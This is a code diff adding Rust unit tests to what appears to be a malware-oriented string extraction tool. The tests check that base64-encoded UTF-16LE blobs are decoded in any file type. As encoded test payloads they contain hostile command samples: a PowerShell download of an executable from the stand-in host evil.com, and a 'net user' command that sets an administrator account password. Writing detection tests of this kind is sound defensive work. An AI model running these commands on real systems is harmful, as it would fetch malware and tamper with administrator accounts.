@@ -439,6 +439,60 @@ Invoke-Expression $cmd
     );
 }
 
+// ============================================================================
+// Generic base64-over-UTF-16LE (Windows "wide" encoding) — must be decoded in
+// ANY filetype, not only when wrapped in a recognized PowerShell pattern.
+// ============================================================================
+
+/// Encode an ASCII string the way Windows does: little-endian UTF-16, then base64.
+fn b64_utf16le(s: &str) -> String {
+    let utf16: Vec<u8> = s.encode_utf16().flat_map(u16::to_le_bytes).collect();
+    base64::engine::general_purpose::STANDARD.encode(&utf16)
+}
+
+#[test]
+fn test_bare_base64_utf16le_in_plain_text() {
+    // A wide-encoded payload sitting in an ordinary config/text file with no
+    // PowerShell marker around it. It must still decode via the generic path.
+    let blob = b64_utf16le("Invoke-WebRequest http://evil.com/x.exe");
+    let src = format!("setting_value = {blob}\n");
+
+    let opts = ExtractOptions::new(4);
+    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);
+
+    assert!(
+        strings
+            .iter()
+            .any(|s| s.method == StringMethod::Base64Decode && s.value.contains("evil.com")),
+        "Bare base64-over-UTF-16LE should decode in any filetype. Got: {:?}",
+        strings.iter().map(|s| &s.value).collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn test_decode_encoded_strings_surfaces_wide_payload() {
+    // Exercises the public helper the CLI text path relies on: given a raw
+    // string that is itself a wide-encoded base64 blob, it must recover the text.
+    let blob = b64_utf16le("net user administrator P@ssw0rd /add");
+    let raw = vec![stng::ExtractedString {
+        value: blob,
+        data_offset: 0,
+        section: None,
+        method: StringMethod::RawScan,
+        kind: Some(StringKind::Base64),
+        ..Default::default()
+    }];
+    let decoded = stng::decode_encoded_strings(&raw);
+
+    assert!(
+        decoded
+            .iter()
+            .any(|s| s.value == "net user administrator P@ssw0rd /add"),
+        "decode_encoded_strings should recover the wide payload. Got: {:?}",
+        decoded.iter().map(|s| &s.value).collect::<Vec<_>>()
+    );
+}
+
 #[test]
 fn test_powershell_char_array() {
     // iex([char[]](87,104,111,97,109,105) -join '')  → "Whoami"
